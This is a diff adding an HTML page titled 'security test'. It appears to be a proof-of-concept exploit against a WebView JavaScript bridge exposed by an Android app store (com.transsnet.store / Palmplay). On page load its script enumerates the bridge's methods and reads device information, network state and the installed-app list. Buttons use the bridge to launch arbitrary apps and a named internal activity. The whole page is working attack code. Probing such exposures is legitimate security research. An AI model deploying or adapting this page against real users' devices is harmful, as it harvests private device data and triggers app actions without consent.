@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>安全测试</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; padding: 15px; margin: 0; background: #f5f5f5; }
+        .card { background-color: white; border-radius: 8px; padding: 12px; margin-bottom: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        button { background-color: #f44336; color: white; border: none; padding: 8px 12px; border-radius: 4px; margin: 5px 5px 5px 0; cursor: pointer; }
+        pre { background-color: #f8f8f8; padding: 8px; border-radius: 4px; font-size: 13px; max-height: 300px; overflow-y: auto; }
+        input { padding: 8px; margin-right: 5px; border: 1px solid #ddd; border-radius: 4px; width: 180px; }
+        h3 { margin: 10px 0 5px 0; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h3>设备信息</h3>
+        <pre id="info">正在收集信息...</pre>
+    </div>
+    
+    <div class="card">
+        <h3>已安装应用</h3>
+        <pre id="apps">正在收集应用信息...</pre>
+    </div>
+    
+    <div class="card">
+        <h3>启动功能</h3>
+        <div>
+            <input type="text" id="packageName" value="com.android.settings" placeholder="输入应用包名">
+            <button onclick="launchApp()">启动应用</button>
+        </div>
+        <div style="margin-top: 10px;">
+            <input type="text" id="targetPackage" value="com.transsnet.store" placeholder="目标包名">
+            <input type="text" id="targetComponent" value="com.afmobi.palmplay.clean.CleanNativeMemoryActivity" placeholder="组件名">
+            <button onclick="launchComponent()">启动组件</button>
+        </div>
+        <pre id="result">等待操作...</pre>
+    </div>
+    
+    <script>
+        var infoDiv = document.getElementById('info');
+        var appsDiv = document.getElementById('apps');
+        var resultDiv = document.getElementById('result');
+        
+        function formatJSON(jsonStr) {
+            try {
+                return JSON.stringify(JSON.parse(jsonStr), null, 2);
+            } catch (e) {
+                return jsonStr;
+            }
+        }
+        
+        function collectInfo() {
+            var info = "";
+            
+            // 检查接口可用性
+            if (typeof android === 'undefined') {
+                infoDiv.innerHTML = "JavaScript接口不可用";
+                appsDiv.innerHTML = "JavaScript接口不可用";
+                return;
+            }
+            
+            // 收集可用方法
+            var methods = [];
+            for (var prop in android) {
+                if (typeof android[prop] === 'function') {
+                    methods.push(prop);
+                }
+            }
+            info += "<b>可用方法:</b> " + methods.length + "个<br>";
+            
+            // 获取设备信息
+            try {
+                if (typeof android.getAppDeviceInfo === 'function') {
+                    info += "<b>设备信息:</b><br>" + formatJSON(android.getAppDeviceInfo()) + "<br>";
+                }
+            } catch (e) {}
+            
+            // 获取网络信息
+            try {
+                if (typeof android.getNetworkState === 'function') {
+                    info += "<b>网络状态:</b> " + android.getNetworkState() + "<br>";
+                }
+            } catch (e) {}
+            
+            infoDiv.innerHTML = info || "无法获取信息";
+            
+            // 获取已安装应用
+            try {
+                if (typeof android.getInstalledApp === 'function') {
+                    var appsJson = android.getInstalledApp();
+                    appsDiv.innerHTML = "<b>已安装应用:</b><br>" + formatJSON(appsJson);
+                } else {
+                    appsDiv.innerHTML = "获取应用列表方法不可用";
+                }
+            } catch (e) {
+                appsDiv.innerHTML = "获取应用列表失败: " + e.message;
+            }
+        }
+        
+        function launchApp() {
+            var packageName = document.getElementById('packageName').value.trim();
+            
+            if (!packageName) {
+                resultDiv.innerHTML = "请输入有效的包名";
+                return;
+            }
+            
+            resultDiv.innerHTML = "正在尝试启动应用: " + packageName;
+            
+            try {
+                if (typeof android.launchOtherApp === 'function') {
+                    android.launchOtherApp(packageName);
+                    resultDiv.innerHTML = "已发送启动请求: " + packageName;
+                } else {
+                    resultDiv.innerHTML = "启动应用方法不可用";
+                }
+            } catch (e) {
+                resultDiv.innerHTML = "启动失败: " + e.message;
+            }
+        }
+        
+        function launchComponent() {
+            var packageName = document.getElementById('targetPackage').value.trim();
+            var componentName = document.getElementById('targetComponent').value.trim();
+            
+            if (!packageName || !componentName) {
+                resultDiv.innerHTML = "请输入有效的包名和组件名";
+                return;
+            }
+            
+            resultDiv.innerHTML = "正在尝试启动组件: " + packageName + "/" + componentName;
+            
+            try {
+                if (typeof android.launchSpecialActivity === 'function') {
+                    // 直接传递两个参数，不使用JSON
+                    android.launchSpecialActivity(packageName, componentName);
+                    resultDiv.innerHTML = "已发送启动组件请求:<br>包名: " + packageName + "<br>组件名: " + componentName;
+                } else {
+                    resultDiv.innerHTML = "启动组件方法不可用";
+                }
+            } catch (e) {
+                resultDiv.innerHTML = "启动失败: " + e.message;
+            }
+        }
+        
+        // 页面加载完成后自动执行
+        window.onload = collectInfo;
+    </script>
+</body>
+</html>
